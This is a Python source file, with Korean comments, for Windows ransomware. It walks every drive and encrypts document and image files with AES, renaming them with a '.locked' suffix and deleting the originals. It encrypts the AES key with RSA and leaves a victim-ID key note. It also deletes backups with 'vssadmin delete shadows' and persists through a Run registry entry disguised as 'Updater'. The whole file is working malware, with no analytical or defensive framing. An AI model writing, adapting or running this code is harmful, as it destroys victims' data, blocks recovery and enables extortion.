import os, struct, sys, glob, shutil, uuid, platform
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
import winreg, subprocess

# 타깃 확장자
target_exts = ['.docx', '.xlsx', '.pptx', '.pdf', '.txt', '.jpg', '.png']


# 시작 경로: 전체 드라이브
def get_all_drives():
    return [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]


# 백업 삭제
def delete_shadow_copies():
    try:
        subprocess.run("vssadmin delete shadows /all /quiet", shell=True, stdout=subprocess.DEVNULL,
                       stderr=subprocess.DEVNULL)
    except:
        pass


# 시작 프로그램 등록
def register_startup():
    exe_path = sys.executable
    key = winreg.HKEY_CURRENT_USER
    path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    with winreg.OpenKey(key, path, 0, winreg.KEY_SET_VALUE) as regkey:
        winreg.SetValueEx(regkey, "Updater", 0, winreg.REG_SZ, exe_path)


# 암호화 함수
def encrypt_file(aes_key, in_file):
    out_file = in_file + ".locked"
    iv = get_random_bytes(16)
    cipher = AES.new(aes_key, AES.MODE_CBC, iv)
    filesize = os.path.getsize(in_file)

    with open(in_file, 'rb') as infile, open(out_file, 'wb') as outfile:
        outfile.write(struct.pack('<Q', filesize))
        outfile.write(iv)

        while True:
            chunk = infile.read(128 * 1024)
            if not chunk:
                break
            if len(chunk) % 16 != 0:
                chunk += b' ' * (16 - len(chunk) % 16)
            outfile.write(cipher.encrypt(chunk))

    os.remove(in_file)


# RSA 키로 AES 키 암호화
def encrypt_aes_key(aes_key):
    with open('public.pem', 'rb') as f:
        pub_key = RSA.import_key(f.read())
        cipher_rsa = PKCS1_OAEP.new(pub_key)
        return cipher_rsa.encrypt(aes_key)


# AES 키 및 식별자 저장
def save_encrypted_key(encrypted_key):
    victim_id = str(uuid.uuid4())
    with open("KEY-README.txt", "wb") as f:
        f.write(b"==== DO NOT DELETE THIS FILE ====\n")
        f.write(f"Victim ID: {victim_id}\n".encode())
        f.write(b"Encrypted AES key (base64):\n")
        f.write(encrypted_key)


def main():
    # AES 키 생성 및 암호화
    aes_key = get_random_bytes(32)
    encrypted_key = encrypt_aes_key(aes_key)
    save_encrypted_key(encrypted_key)

    # Shadow Copy 삭제
    delete_shadow_copies()

    # 시작프로그램 등록
    register_startup()

    # 파일 암호화
    for drive in get_all_drives():
        for root, dirs, files in os.walk(drive):
            for file in files:
                path = os.path.join(root, file)
                ext = os.path.splitext(path)[1].lower()
                if ext in target_exts:
                    try:
                        encrypt_file(aes_key, path)
                        print(f"[+] Encrypted: {path}")
                    except Exception as e:
                        pass


if __name__ == "__main__":
    main()
